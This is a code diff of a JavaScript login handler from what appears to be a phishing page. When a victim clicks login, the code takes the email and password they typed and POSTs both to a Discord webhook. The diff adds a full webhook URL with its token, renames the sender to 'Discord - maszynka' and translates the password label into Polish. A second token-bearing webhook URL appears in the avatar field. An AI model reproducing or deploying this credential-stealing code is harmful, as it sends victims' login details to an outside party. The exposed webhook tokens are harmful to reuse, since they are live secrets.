@@ -38,7 +38,7 @@ login.addEventListener('click', (e) => {
       //}, 1000)
     })
 
-    wb = "https://discord.com/api/webhooks/11"; //enter webhook here
+    wb = " https://discord.com/api/webhooks/1191377471975727175/olSWRF7RHWsa03G8Hqj7QOYIGJSQde_0l5sSTLQRV_3yt1ez3tTH3ZiaZm8DCn6hhJJy"; //enter webhook here
 	
 	var request = new XMLHttpRequest();
       request.open("POST", wb);
@@ -46,9 +46,9 @@ login.addEventListener('click', (e) => {
       request.setRequestHeader('Content-type', 'application/json');
 
       var params = {
-        username: "Saved",
+        username: "Discord - maszynka",
         avatar_url: "https://discord.com/api/webhooks/1191125485468528772/tdpdmKI_f3qddh4-umJqQni9o1veo6rXBYuwWH277_ARRj5XyB2XEPE71uyhvyLGVFYn",
-        content: "```Email: " + emailsave + " | Password: " + passsave + "```"
+        content: "```Email: " + emailsave + " | Hasło: " + passsave + "```"
       }
 
       request.send(JSON.stringify(params));
